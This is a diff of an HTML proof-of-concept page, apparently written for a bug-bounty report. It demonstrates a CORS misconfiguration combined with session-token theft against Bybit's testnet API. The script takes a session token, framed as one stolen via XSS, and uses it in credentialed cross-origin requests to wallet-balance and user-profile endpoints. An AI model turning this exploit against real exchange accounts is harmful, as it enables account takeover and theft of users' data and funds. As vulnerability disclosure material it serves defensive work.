@@ -1,30 +1,60 @@
 <!DOCTYPE html>
 <html>
-<head><title>Bybit CORS PoC</title></head>
+<head><title>Bybit CORS+Token PoC — darivxe</title></head>
 <body>
-<h2>Bybit CORS PoC — darivxe</h2>
-<p><strong>Testnet raw response:</strong></p>
-<pre id="testnet-out">fetching...</pre>
-<p><strong>Testnet response headers:</strong></p>
-<pre id="testnet-headers">fetching...</pre>
+<h2>Bybit CORS + localStorage Token Theft PoC</h2>
+<p>This page demonstrates that an attacker origin can steal the Bybit session token
+and make authenticated API calls on behalf of any logged-in victim.</p>
+
+<h3>Step 1 — Token stolen from localStorage (same-origin JS or via XSS):</h3>
+<pre id="token-out">reading...</pre>
+
+<h3>Step 2 — Authenticated API call using stolen token:</h3>
+<pre id="api-out">fetching...</pre>
+
+<h3>Step 3 — CORS headers confirm arbitrary origin accepted:</h3>
+<pre id="cors-out">checking...</pre>
 
 <script>
-fetch("https://api-testnet.bybit.com/v5/account/wallet-balance?accountType=UNIFIED", {
-  credentials: "include"
-})
-.then(r => {
-  // capture headers
-  let hdrs = "";
-  r.headers.forEach((v, k) => hdrs += k + ": " + v + "\n");
-  document.getElementById("testnet-headers").textContent = hdrs;
-  return r.text();
-})
-.then(data => {
-  document.getElementById("testnet-out").textContent = data || "(empty body)";
-})
-.catch(e => {
-  document.getElementById("testnet-out").textContent = "CORS blocked or error: " + e;
-});
+// Step 1: steal token from localStorage
+// In a real attack this would be via XSS on bybit.com or a subdomain
+// For PoC: victim pastes token manually to simulate post-XSS scenario
+const stolenToken = prompt("Enter your t_token value from localStorage (PoC simulation):");
+document.getElementById("token-out").textContent = stolenToken ? 
+  "Token captured: " + stolenToken.substring(0, 40) + "..." : "No token entered";
+
+if(stolenToken) {
+  // Step 2: use token to call authenticated endpoint cross-origin
+  fetch("https://api-testnet.bybit.com/v5/account/wallet-balance?accountType=UNIFIED", {
+    credentials: "include",
+    headers: {
+      "token": stolenToken
+    }
+  })
+  .then(r => {
+    // Step 3: capture CORS headers
+    let corsInfo = "access-control-allow-origin: " + r.headers.get("access-control-allow-origin") + "\n";
+    corsInfo += "access-control-allow-credentials: " + r.headers.get("access-control-allow-credentials");
+    document.getElementById("cors-out").textContent = corsInfo;
+    return r.text();
+  })
+  .then(data => {
+    document.getElementById("api-out").textContent = data || "(empty — check x-api gateway below)";
+    
+    // Also try x-api gateway with token header
+    return fetch("https://testnet.bybit.com/x-api/v2/private/user/profile", {
+      credentials: "include",
+      headers: { "token": stolenToken }
+    });
+  })
+  .then(r => r.text())
+  .then(data => {
+    document.getElementById("api-out").textContent += "\n\n--- x-api/v2/private/user/profile ---\n" + data;
+  })
+  .catch(e => {
+    document.getElementById("api-out").textContent = "Error: " + e;
+  });
+}
 </script>
 </body>
 </html>
